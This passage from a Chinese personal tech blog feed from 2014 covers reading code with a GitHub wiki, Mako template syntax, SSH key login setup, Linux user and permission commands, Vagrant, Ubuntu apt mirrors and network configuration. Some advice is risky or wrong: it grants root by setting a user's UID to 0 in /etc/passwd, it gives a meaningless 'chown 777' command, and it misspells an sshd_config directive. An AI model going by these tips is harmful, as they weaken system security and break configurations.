&lt;p&gt;使用IDE阅读当然也是挺方便在代码中穿梭的。   &lt;/p&gt;
&lt;p&gt;可我觉得阅读代码重要的不只是定位。而是如何随时记录，让你的阅读过程不会随着时间的中断而中断，这样我们的阅读过程是可积累的。对于大型项目，我们不能太过于依赖记忆力，尤其是我这种记忆力渣渣的渣渣，我更倾向于求助于工具。技术解放大脑～这样大脑内存就可以去存储更多有趣的东西了，诗词歌赋文章歌词泡妞策略 and so on ...&lt;/p&gt;
&lt;p&gt;其实这有点像阅读时能随时做批注，github项目自带的wiki是个不错的选择，我们同时打开项目源码和wiki页面，阅读到某处，需要做笔记时，切换到wiki页面记录。&lt;/p&gt;
&lt;p&gt;我们使用markdown语法，可以轻易记录源码位置链接。具体实例参考的我的wiki&lt;/p&gt;
&lt;p&gt;那么精确到行的url链接是如何取得的呢。  其实很简单。&lt;br /&gt;
鼠标在某行前边的数字上点击，你看浏览器导航栏里的url就发生变化了，完整复制下url就行。&lt;/p&gt;
&lt;p&gt;泡上一杯咖啡，读你的源码去吧。&lt;/p&gt;
&lt;p&gt;现在你再也不用害怕阅读过程被打断了。&lt;/p&gt;
&lt;p&gt;你看妹子给你来微信了是吧，停下手头工作勾搭妹子去吧。随时回来你都可以继续你的源码阅读～&lt;/p&gt;
&lt;p&gt;简直像断点续传有木有！！&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 18 Jul 2014 00:00:00 +0000</pubDate><guid>tag:,2014-07-18:github-edx.html</guid><category>edx</category></item><item><title>mako学习笔记</title><link>/learn-mako.html</link><description>&lt;p&gt;edx抛弃了django自身的模板，选择使用mako。&lt;/p&gt;
&lt;h2&gt;关于mako&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Mako is a template library written in Python.  Mako's syntax and API borrows from the best ideas of many others, including Django and Jinja2 templates, Cheetah, Myghty, and Genshi&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;mako设计哲学&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Python is a great scripting language. Don't reinvent the wheel...your templates can handle it !&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;中文文档(摘自&lt;a href="http://www.yeolar.com/note/2012/08/28/mako-syntax"&gt;这儿&lt;/a&gt;)&lt;/h2&gt;
&lt;h4&gt;表达式替换&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;from mako.template import Template
t = Template(&amp;#39;hello, ${name}!&amp;#39;)
print t.render(name=&amp;#39;yeolar&amp;#39;)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;${} 标签中的内容由Python直接计算，因此也可以使用完整的表达式：&lt;/p&gt;
&lt;h4&gt;表达式转义&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;${&amp;quot;this is some text&amp;quot; | u}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;u 表示URL转义， h 表示HTML转义， x 表示XML转义， trim 为空白截断函数。&lt;/p&gt;
&lt;p&gt;更多有关内建的过滤函数，包括如何编写自己的过滤函数，见&lt;a href="http://docs.makotemplates.org/en/latest/filtering.html"&gt;Filtering and Buffering&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;控制结构&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;% for a in [&amp;#39;one&amp;#39;, &amp;#39;two&amp;#39;, &amp;#39;three&amp;#39;, &amp;#39;four&amp;#39;, &amp;#39;five&amp;#39;]:
    % if a[0] == &amp;#39;t&amp;#39;:
    its two or three
    % elif a[0] == &amp;#39;f&amp;#39;:
    four/five
    % else:
    one
    % endif
% endfor
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;控制结构写成 % 标记后面跟正常的Python控制表达式&lt;/p&gt;
&lt;p&gt;% 可以放在前面没有文本的行的任何地方，并且缩进是不敏感的。Python所有的“冒号”表达式都可以使用，包括 if/elif/else 、 while 、 for ，甚至是 def ，不过对 def Mako有更好的内建标签。&lt;/p&gt;
&lt;h4&gt;循环上下文&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;% for a in (&amp;quot;one&amp;quot;, &amp;quot;two&amp;quot;, &amp;quot;three&amp;quot;):
    &amp;lt;li&amp;gt;Item ${loop.index}: ${a}&amp;lt;/li&amp;gt;
% endfor
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;注释&lt;/h4&gt;
&lt;p&gt;有两种形式的注释。单行注释在行首使用 ##&lt;/p&gt;
&lt;p&gt;多行注释通过
&lt;code&gt;&amp;lt;%doc&amp;gt;&amp;lt;/%doc&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;h4&gt;Python代码块&lt;/h4&gt;
&lt;p&gt;可以用 &amp;lt;% %&amp;gt; 标签引入任意Python代码块  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;lt;%
    x = db.get_resource(&amp;#39;foo&amp;#39;)
    y = [z.element for z in x if x.frobnizzle==5]
%&amp;gt;
% for elem in y:
    element: ${elem}
% endfor
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&amp;lt;% %&amp;gt; 里面，可以写普通的Python代码块。代码的整体缩进不受限制&lt;/p&gt;
&lt;h4&gt;模块级的块&lt;/h4&gt;
&lt;p&gt;用 &amp;lt;%! %&amp;gt; 表示  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;lt;%!
    import mylib
    import re

    def filter(text):
        return re.sub(r&amp;#39;^@&amp;#39;, &amp;#39;&amp;#39;, text)
%&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;代码不能访问模板的上下文&lt;/p&gt;
&lt;p&gt;放在所有渲染调用之前。&lt;/p&gt;
&lt;h4&gt;标签&lt;/h4&gt;
&lt;p&gt;Mako提供的其他东西以标签的形式出现。所有标签使用相同的语法，和XML标签类似，但是在标签名之前加上了 % 字符。标签结束方式和XML类似：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;lt;%include file=&amp;quot;foo.txt&amp;quot;/&amp;gt;

&amp;lt;%def name=&amp;quot;foo&amp;quot; buffered=&amp;quot;True&amp;quot;&amp;gt;
    this is a def
&amp;lt;/%def&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&amp;lt;%page&amp;gt; ：该标签定义了模板的一些通用特性，包括缓存参数和模板调用的参数的可选列表。&lt;/li&gt;
&lt;li&gt;&amp;lt;%include&amp;gt;：%include 接受一个文件参数，调用那个文件的渲染结果&lt;/li&gt;
&lt;li&gt;&amp;lt;%def&amp;gt;：%def 标签定义一个Python函数，函数可以在模板的其他位置调用。&lt;/li&gt;
&lt;li&gt;&amp;lt;%block&amp;gt;：借鉴了Jinja2的块，有名字的块实现了一种很方便的继承方法&lt;/li&gt;
&lt;li&gt;&amp;lt;%namespace&amp;gt;：和Python的 import 语句等价&lt;/li&gt;
&lt;li&gt;&amp;lt;%inherit&amp;gt;：通过继承可以实现模板的继承链。它和其他模板语言的概念类似。&lt;/li&gt;
&lt;li&gt;&amp;lt;% return %&amp;gt;：有时你想在模板或 &amp;lt;%def&amp;gt; 方法的中间停止处理，只用当前得到的结果&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;一些笔记&lt;/h2&gt;
&lt;h4&gt;&lt;a href="http://docs.makotemplates.org/en/latest/namespaces.html"&gt;namespace&lt;/a&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;Namespaces are used to organize groups of defs into categories, and also to “import” defs from other files.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;很像python中的模块。类比模块的思路可以很快理解&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;## components.html
&amp;lt;%def name=&amp;quot;comp1()&amp;quot;&amp;gt;
    this is comp1
&amp;lt;/%def&amp;gt;

&amp;lt;%def name=&amp;quot;comp2(x)&amp;quot;&amp;gt;
    this is comp2, x is ${x}
&amp;lt;/%def&amp;gt;

## index.html
&amp;lt;%namespace name=&amp;quot;comp&amp;quot; file=&amp;quot;components.html&amp;quot;/&amp;gt;

Here&amp;#39;s comp1:  ${comp.comp1()}
Here&amp;#39;s comp2:  ${comp.comp2(x=5)}

##可以包含import属性
&amp;lt;%namespace file=&amp;quot;components.html&amp;quot; import=&amp;quot;comp1, comp2&amp;quot;/&amp;gt;
Heres comp1:  ${comp1()}
Heres comp2:  ${comp2(x=5)}
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;&lt;a href="http://docs.makotemplates.org/en/latest/defs.html"&gt;Defs and Blocks&lt;/a&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;lt;%def&amp;gt; provides a construct that is very much like a named Python def, the &amp;lt;%block&amp;gt; is more layout oriented.&lt;/p&gt;
&lt;p&gt;named blocks can be referred to by an inheriting template.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;lt;%def name=&amp;quot;hello()&amp;quot;&amp;gt;
    hello world
&amp;lt;/%def&amp;gt;

the def:  ${hello()}
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;&lt;a href="http://docs.makotemplates.org/en/latest/inheritance.html"&gt;inheritance&lt;/a&gt;&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;## index.html
&amp;lt;%inherit file=&amp;quot;base.html&amp;quot;/&amp;gt;

&amp;lt;%block name=&amp;quot;header&amp;quot;&amp;gt;
    this is some header content
&amp;lt;/%block&amp;gt;

this is the body content.

## base.html
&amp;lt;html&amp;gt;
    &amp;lt;body&amp;gt;
        &amp;lt;div class=&amp;quot;header&amp;quot;&amp;gt;
            &amp;lt;%block name=&amp;quot;header&amp;quot;/&amp;gt;
        &amp;lt;/div&amp;gt;

        ${self.body()}

        &amp;lt;div class=&amp;quot;footer&amp;quot;&amp;gt;
            &amp;lt;%block name=&amp;quot;footer&amp;quot;&amp;gt;
                this is the footer
            &amp;lt;/%block&amp;gt;
        &amp;lt;/div&amp;gt;
    &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;

##output
&amp;lt;html&amp;gt;
    &amp;lt;body&amp;gt;
        &amp;lt;div class=&amp;quot;header&amp;quot;&amp;gt;
            this is some header content
        &amp;lt;/div&amp;gt;

        this is the body content.

        &amp;lt;div class=&amp;quot;footer&amp;quot;&amp;gt;
            this is the footer
        &amp;lt;/div&amp;gt;
    &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;defs和block的区别
The def simply doesn’t call itself automatically。&lt;/p&gt;
&lt;p&gt;以下两者等效&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;##def
&amp;lt;%def name=&amp;quot;header()&amp;quot;&amp;gt;&amp;lt;/%def&amp;gt;${self.header()}

##block
&amp;lt;%block name=&amp;quot;header()&amp;quot;&amp;gt;&amp;lt;/%block&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;参考教程&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://docs.makotemplates.org/en/latest/"&gt;docs.makotemplates.org&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://help.42qu.com/code/mako.html"&gt;mako 模板入门&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.yeolar.com/note/2012/08/28/mako-syntax/"&gt;Python模板库Mako的语法（译自官方文档）&lt;/a&gt;*  &lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 14 Jul 2014 00:00:00 +0000</pubDate><guid>tag:,2014-07-14:learn-mako.html</guid><category>edx</category></item><item><title>ssh相关</title><link>/ssh.html</link><description>&lt;h2&gt;安装（ubuntu）&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;sudo apt-get install openssh-server&lt;/code&gt;&lt;/p&gt;
&lt;h2&gt;配置&lt;/h2&gt;
&lt;h3&gt;允许密码配置&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;vim /etc/ssh/sshd_config&lt;/code&gt;使：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;PasswordAuthentication yes&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;安全相关&lt;/h3&gt;
&lt;p&gt;修改登录端口&lt;/p&gt;
&lt;p&gt;&lt;code&gt;vim /etc/ssh/sshd_config&lt;/code&gt;使：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Port [port]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;端口号选择大一些，被随机扫描的可能性更小&lt;/p&gt;
&lt;h3&gt;使用密钥登录并禁止口令登录实践&lt;/h3&gt;
&lt;p&gt;这是最相对安全的登录管理方式&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;#以下用户都是root（sudo）

#生成SSH密钥对，一路回车就行
ssh-keygen -t rsa

#复制公钥到无密码登录的服务器上,22端口改变可以使用下面的命令
#ssh-copy-id -i ~/.ssh/id_rsa.pub -p 10022 user@server
ssh-copy-id -i ~/.ssh/id_rsa.pub root@192.168.15.241
#登录时需要使用相应账号登录

#也可以登录被控机器后 cd .ssh，wget https://github.com/wwj718.keys 之后chmod 600 authorized_keys
#authorized_keys 文件必须是600权限或者644
#.ssh目录必须是700权限
#/home/ubuntu 目录必须是755权限

#修改SSH配置文件
#编辑sshd_config文件
vi /etc/ssh/sshd_config

#禁用密码验证
PasswordAuthentication no
#启用密钥验证
RSAAuthentication yes
PubkeyAuthentication yes
#指定公钥数据库文件
AuthorsizedKeysFile .ssh/authorized_keys

#重启SSH服务前建议多保留一个会话以防不测

#手动增加管理用户
echo &amp;#39;ssh-rsa XXXX&amp;#39; &amp;gt;&amp;gt;/root/.ssh/authorized_keys

# 复查
cat /root/.ssh/authorized_keys
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;重启&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;#RHEL/CentOS系统
service sshd restart
#ubuntu系统
service ssh restart
#debian系统
/etc/init.d/ssh restart
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;补遗&lt;/h1&gt;
&lt;h3&gt;X11 Forwarding&lt;/h3&gt;
&lt;p&gt;通过使用ssh -X user@host，可以做到开启远端GUI应用，就像在本地开启一样,max下需要安装Quartz&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;2016-05-04修改&lt;/p&gt;
&lt;h1&gt;SSH 简化配置&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;强烈建议使用 ssh-copy-id来移动你的公共密钥&lt;/li&gt;
&lt;li&gt;使用&lt;code&gt;~/.ssh/config&lt;/code&gt;, 你可以在~/.ssh/config里面指定相当数量的配置选项，强烈建议看网上的文档或者 ssh_config 手册页&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# contents of $HOME/.ssh/config
Host dev
    HostName dev.example.com
    Port 22000
    User fooey
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;ssh startx&lt;/h1&gt;
&lt;p&gt;使用ssh进入图形界面&lt;/p&gt;
&lt;p&gt;&lt;a href="http://askubuntu.com/questions/163155/how-do-i-access-my-remote-ubuntu-server-via-x-windows-from-my-mac"&gt;How do I access my remote Ubuntu server via X-windows from my Mac&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/xitu/gold-miner/blob/master/TODO/simplify-your-life-with-an-ssh-config-file.md"&gt;SSH 简化配置&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 10 Jul 2014 00:00:00 +0000</pubDate><guid>tag:,2014-07-10:ssh.html</guid><category>ubuntu</category></item><item><title>linux下用户与文件权限</title><link>/user.html</link><description>&lt;h2&gt;用户&lt;/h2&gt;
&lt;h3&gt;创建用户(useradd)&lt;/h3&gt;
&lt;p&gt;&lt;pre&gt;
新建用户
adduser  test //useradd test 也行，建议使用adduser 更友好&lt;/p&gt;
&lt;p&gt;删除用户
sudo userdel -r username&lt;/p&gt;
&lt;p&gt;修改密码
passwd test(username) &lt;/p&gt;
&lt;p&gt;将新用户添加到管理组
gpasswd -a test admin &lt;br /&gt;
gpasswd -a test sudo  &lt;/p&gt;
&lt;p&gt;给test用户创建自己的目录：
cd /home
mkdir test
chown test /home/test
&lt;/pre&gt;&lt;/p&gt;
&lt;h2&gt;为用户添加root权限&lt;/h2&gt;
&lt;p&gt;修改 /etc/passwd 文件，找到如下行，把用户ID修改为 0 ，如下所示：&lt;br /&gt;
tommy:x:50&lt;code&gt;0&lt;/code&gt;:500:tommy:/home/tommy:/bin/bash`&lt;br /&gt;
登陆后就直接是root，不显示用户名，edx中的edxapp就是如此  &lt;/p&gt;
&lt;h2&gt;adduser&lt;/h2&gt;
&lt;p&gt;adduser更适合初级使用者,不用去记那些繁琐的参数选项，只要跟着系统的提示一步一步进行下去就行&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;文件权限&lt;/h2&gt;
&lt;h3&gt;做个实验&lt;/h3&gt;
&lt;p&gt;&lt;pre&gt;
cd tmp 
touch test.md
ls -l test.md&lt;/p&gt;
&lt;p&gt;输出：-rw-rw-r-- 1 wwj wwj 0  7月 11 14:55 test.md
&lt;/pre&gt;
其中，我们来看-rw-rw-r--。该字段中的首字符（-）指定该文件的类型，-表示常规文件。&lt;br /&gt;
后边三个三元组w-rw-r--，第一个三元字符组代表文件所有者的权限，第二个代表文件的组的权限，第三个代表所有其他用户的权限。&lt;br /&gt;
r 表示允许读（查看文件中的数据），w 表示允许写（修改文件以及删除），x 表示允许“执行”（运行程序）。&lt;/p&gt;
&lt;h3&gt;改变用户和组所有权&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;chown root /etc/passwd
chgrp wheel /etc/passwd
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;为了改变文件或其它文件系统对象的所有者或组，分别使用 &lt;code&gt;chown&lt;/code&gt; 或 &lt;code&gt;chgrp&lt;/code&gt;，这两个命令都要一个用户名或组名作参数，后面跟上一个或多个文件名。&lt;br /&gt;
除非您是超级用户，否则您不可以使用 chown，然而任何人都可以使用 chgrp 来将文件的组所有权改为他们所属的组。&lt;br /&gt;
chown 和 chgrp 都有一个 -R 选项，该选项可以用来告诉它们递归地将所属权&lt;/p&gt;
&lt;p&gt;sudo chown 777 所有用户&lt;/p&gt;
&lt;h3&gt;修改rwx权限&lt;/h3&gt;
&lt;p&gt;chmod — 用来改变我们可以在 ls -l 清单中看到的 rwx 权限，比如增加执行权限：&lt;code&gt;chmod +x scriptfile.sh&lt;/code&gt;，同理移除权限：&lt;code&gt;chmod -x scriptfile.sh&lt;/code&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;参考&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://os.51cto.com/art/201104/256231.htm"&gt;Ubuntu中useradd和adduser的区别&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://justcoding.iteye.com/blog/1929063"&gt;Ubuntu用户及用户组管理命令&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://wiki.ubuntu.org.cn/新建用户并添加到管理组"&gt;新建用户并添加到管理组&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://zhangfeikr.blog.51cto.com/1999170/396541"&gt;Linux文件权限设置详解&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 10 Jul 2014 00:00:00 +0000</pubDate><guid>tag:,2014-07-10:user.html</guid><category>linux</category></item><item><title>vagrant</title><link>/vagrant.html</link><description>&lt;h3&gt;init&lt;/h3&gt;
&lt;p&gt;&lt;pre&gt;
vagrant box add BOX_NAME xxx.box&lt;/p&gt;
&lt;p&gt;vagrant init&lt;/p&gt;
&lt;p&gt;vagrant up
&lt;/pre&gt;&lt;/p&gt;
&lt;h3&gt;常用操作&lt;/h3&gt;
&lt;p&gt;&lt;pre&gt;
vagrant up （启动虚拟机）
vagrant halt （关闭虚拟机）
vagrant suspend （暂停虚拟机——只是暂停，虚拟机内存等信息将以状态文件的方式保存在本地，可以执行恢复操作后继续使用）
vagrant resume （恢复虚拟机 —— 与前面的暂停相对应）
vagrant destroy （删除虚拟机，删除后在当前虚拟机所做进行的除开Vagrantfile中的配置都不会保留）
&lt;/pre&gt;&lt;/p&gt;
&lt;h3&gt;&lt;/h3&gt;
&lt;hr /&gt;
&lt;h3&gt;参考&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.smdcn.net/article/1308.html"&gt;使用Vagrant在Windows下部署开发环境&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://wing2south.com/post/44371306891/vagrant/"&gt;将Vagrant移出系统盘的方法&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://xuclv.blog.51cto.com/5503169/1239250"&gt;vagrant使用简介(很全)&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cnblogs.com/fuyunbiyi/archive/2013/01/13/2858447.html"&gt;vagrant使用小结（端口映射可参考）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 10 Jul 2014 00:00:00 +0000</pubDate><guid>tag:,2014-07-10:vagrant.html</guid><category>ubuntu</category></item><item><title>ubuntu12.04 apt换源</title><link>/apt-get.html</link><description>&lt;h2&gt;修改源地址：&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;cp /etc/apt/sources.list /etc/apt/sources.list.bak  
vim /etc/apt/sources.list
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;官方源&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;deb http://archive.ubuntu.com/ubuntu/ precise main restricted universe multiverse
deb http://archive.ubuntu.com/ubuntu/ precise-security main restricted universe multiverse
deb http://archive.ubuntu.com/ubuntu/ precise-updates main restricted universe multiverse
deb http://archive.ubuntu.com/ubuntu/ precise-proposed main restricted universe multiverse
deb http://archive.ubuntu.com/ubuntu/ precise-backports main restricted universe multiverse
deb-src http://archive.ubuntu.com/ubuntu/ precise main restricted universe multiverse
deb-src http://archive.ubuntu.com/ubuntu/ precise-security main restricted universe multiverse
deb-src http://archive.ubuntu.com/ubuntu/ precise-updates main restricted universe multiverse
deb-src http://archive.ubuntu.com/ubuntu/ precise-proposed main restricted universe multiverse
deb-src http://archive.ubuntu.com/ubuntu/ precise-backports main restricted universe multiverse
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ubuntu官方提供的其他软件（第三方闭源软件等）&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;deb&lt;/span&gt; &lt;span class="s"&gt;http://archive.canonical.com/ubuntu/&lt;/span&gt; &lt;span class="kp"&gt;precise&lt;/span&gt; &lt;span class="kp"&gt;partner&lt;/span&gt;
&lt;span class="k"&gt;deb&lt;/span&gt; &lt;span class="s"&gt;http://extras.ubuntu.com/ubuntu/&lt;/span&gt; &lt;span class="kp"&gt;precise&lt;/span&gt; &lt;span class="kp"&gt;main&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;中科大：&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;deb http://mirrors.ustc.edu.cn/ubuntu/ precise-updates main restricted
deb-src http://mirrors.ustc.edu.cn/ubuntu/ precise-updates main restricted
deb http://mirrors.ustc.edu.cn/ubuntu/ precise universe
deb-src http://mirrors.ustc.edu.cn/ubuntu/ precise universe
deb http://mirrors.ustc.edu.cn/ubuntu/ precise-updates universe
deb-src http://mirrors.ustc.edu.cn/ubuntu/ precise-updates universe
deb http://mirrors.ustc.edu.cn/ubuntu/ precise multiverse
deb-src http://mirrors.ustc.edu.cn/ubuntu/ precise multiverse
deb http://mirrors.ustc.edu.cn/ubuntu/ precise-updates multiverse
deb-src http://mirrors.ustc.edu.cn/ubuntu/ precise-updates multiverse
deb http://mirrors.ustc.edu.cn/ubuntu/ precise-backports main restricted universe multiverse
deb-src http://mirrors.ustc.edu.cn/ubuntu/ precise-backports main restricted universe multiverse
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;搜狐源：&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;deb http://mirrors.sohu.com/ubuntu/ precise-updates main restricted
deb-src http://mirrors.sohu.com/ubuntu/ precise-updates main restricted
deb http://mirrors.sohu.com/ubuntu/ precise universe
deb-src http://mirrors.sohu.com/ubuntu/ precise universe
deb http://mirrors.sohu.com/ubuntu/ precise-updates universe
deb-src http://mirrors.sohu.com/ubuntu/ precise-updates universe
deb http://mirrors.sohu.com/ubuntu/ precise multiverse
deb-src http://mirrors.sohu.com/ubuntu/ precise multiverse
deb http://mirrors.sohu.com/ubuntu/ precise-updates multiverse
deb-src http://mirrors.sohu.com/ubuntu/ precise-updates multiverse
deb http://mirrors.sohu.com/ubuntu/ precise-backports main restricted universe multiverse
deb-src http://mirrors.sohu.com/ubuntu/ precise-backports main restricted universe multiverse
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;网易源：&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;deb http://mirrors.163.com/ubuntu/ precise-updates main restricted
deb-src http://mirrors.163.com/ubuntu/ precise-updates main restricted
deb http://mirrors.163.com/ubuntu/ precise universe
deb-src http://mirrors.163.com/ubuntu/ precise universe
deb http://mirrors.163.com/ubuntu/ precise-updates universe
deb-src http://mirrors.163.com/ubuntu/ precise-updates universe
deb http://mirrors.163.com/ubuntu/ precise multiverse
deb-src http://mirrors.163.com/ubuntu/ precise multiverse
deb http://mirrors.163.com/ubuntu/ precise-updates multiverse
deb-src http://mirrors.163.com/ubuntu/ precise-updates multiverse
deb http://mirrors.163.com/ubuntu/ precise-backports main restricted universe multiverse
deb-src http://mirrors.163.com/ubuntu/ precise-backports main restricted universe multiverse
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;更新：&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo apt-get update
sudo apt-get upgrade
&lt;/pre&gt;&lt;/div&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 08 Jul 2014 00:00:00 +0000</pubDate><guid>tag:,2014-07-08:apt-get.html</guid><category>ubuntu</category></item><item><title>命令行网络配置</title><link>/network.html</link><description>&lt;p&gt;参考&lt;a href="http://www.cnblogs.com/rusty/archive/2011/04/06/2007139.html"&gt;这个博客&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;通过配置文件配置&lt;/h2&gt;
&lt;h3&gt;1）配置IP网关：sudo gedit /etc/network/interfaces 里面添加&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;dhcp的&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;
auto lo
iface lo inet loopback

auto eth0
iface eth0 inet dhcp
&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;静态IP的&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;
auto lo
iface lo inet loopback
#上面的是回环
#网卡eth0的配置
auto eth0
#staic 静态IP
iface eth0 inet static
address 192.168.1.5
netmask 255.255.255.0
gateway 192.168.1.1
#network 192.168.3.0  
#broadcast 192.168.3.255 
#后面两条是网络号和广播号，这个可以由其它信息计算，因此无需设置
&lt;/pre&gt;

&lt;h3&gt;2）配置DNS： sudo gedit /etc/resolv.conf&lt;/h3&gt;
&lt;p&gt;&lt;pre&gt;
nameserver 202.107.117.11
&lt;/pre&gt;&lt;/p&gt;
&lt;h3&gt;3）主机名：sudo gedit /etc/hostname 里面输入主机名。默认有个主机名，因此这个不是必须的。&lt;/h3&gt;
&lt;h3&gt;4）重启网络：sudo /etc/init.d/networking restart&lt;/h3&gt;
&lt;p&gt;也可以重启网卡：&lt;/p&gt;
&lt;pre&gt;
sudo ifconfig eth0 down 
sudo ifconfig eth0 up
&lt;/pre&gt;

